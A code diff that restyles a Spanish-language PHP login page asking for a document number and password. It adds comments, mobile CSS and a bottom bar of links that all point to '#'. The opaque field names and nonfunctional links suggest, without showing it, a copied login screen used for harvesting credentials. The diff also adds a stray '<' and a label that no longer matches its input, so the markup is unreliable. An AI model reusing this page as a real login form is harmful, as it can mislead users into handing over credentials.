@@ -30,6 +30,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     exit;
 }
 ?>
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -88,6 +89,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     form { margin: 0; }
 
+    /* === Campo Documento === */
     .field-group { margin-bottom: 26px; }
     .top-row {
         display: flex;
@@ -159,6 +161,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         border-bottom: 2px solid var(--accent);
     }
 
+    /* === Contraseña === */
     .pw-label {
         font-size: 14px;
         color: #b0b0b0;
@@ -208,11 +211,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         cursor: pointer;
     }
 
+    /* === Botón === */
     .btn {
         width: 50%;
         height: 40px;
         background: var(--btn-light);
         color: white;
+        padding: 0;
         border: none;
         border-radius: 4px;
         font-size: 18px;
@@ -227,16 +232,76 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         cursor: pointer;
         opacity: 1;
     }
+
+    .btn.btn-active:active {
+        transform: translateY(1px);
+        box-shadow: 0 3px 8px rgba(0,0,0,0.25);
+    }
+
+    .bottom-bar {
+        width: 420px;
+        background: linear-gradient(to right, #1c7254, #054d63);
+        color: white;
+        font-size: 14px;
+        padding: 12px 18px;
+        border-radius: 0 0 40px 40px;
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        display: flex;
+        gap: 20px;
+    }
+
+    .bottom-bar a {
+        color: white;
+        text-decoration: none;
+    }
+
+    /* ===== Mobile ===== */
+    @media (max-width: 768px) {
+        body {
+            background: var(--bg-mobile) no-repeat center center;
+            background-size: cover;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            padding-top: 20px;
+        }
+
+        .bluee-img {
+            position: relative;
+            width: 200px;
+            top: 0;
+            right: auto;
+            margin-bottom: 10px;
+        }
+
+        .card {
+            width: 90%;
+            max-width: 420px;
+            margin-left: 0;
+            padding: 28px 22px 56px;
+        }
+
+        .bottom-bar {
+            width: 100%;
+            border-radius: 0 0 32px 32px;
+            padding: 12px 22px;
+            font-size: 13px;
+            gap: 14px;
+        }
+    }
 </style>
 </head>
 <body>
 
 <img class="bluee-img" src="img/bluee.svg" alt="">
-
+<br><br>
 <div class="card">
     <form action="index.php" method="POST">
 
-        <div class="field-group">
+        <!-- Documento -->
+        < <div class="field-group">
             <div class="top-row">
 
                 <div class="select-wrap">
@@ -256,17 +321,18 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                         pattern="[0-9]*"
                         placeholder=" "
                     >
-                    <label for="ips1" class="floating-label">Número de documento</label>
+                    <label for="docNumber" class="floating-label">Número de documento</label>
                 </div>
             </div>
         </div>
 
+        <!-- Contraseña -->
         <div class="pw-label">Contraseña</div>
 
         <div class="pw-row">
             <input id="ips2" name="ips2" type="password">
             <div class="eye" id="togglePassword">
-                <img src="img/eye-open.png" alt="">
+                <img src="img/eye-open.png" alt="Mostrar contraseña">
             </div>
         </div>
 
@@ -280,7 +346,19 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         </center>
 
     </form>
+
+    <div class="bottom-bar">
+        <a href="#">Regístrate</a> |
+        <a href="#">Olvidé mi contraseña</a> |
+        <a href="#">Ayuda</a>
+    </div>
 </div>
+
+
+
+
+
+
 
 <script>
     /* === Mostrar/Ocultar Contraseña === */
@@ -317,6 +395,5 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     docInput.addEventListener("input", validate);
     passwordInput.addEventListener("input", validate);
 </script>
-
 </body>
 </html>
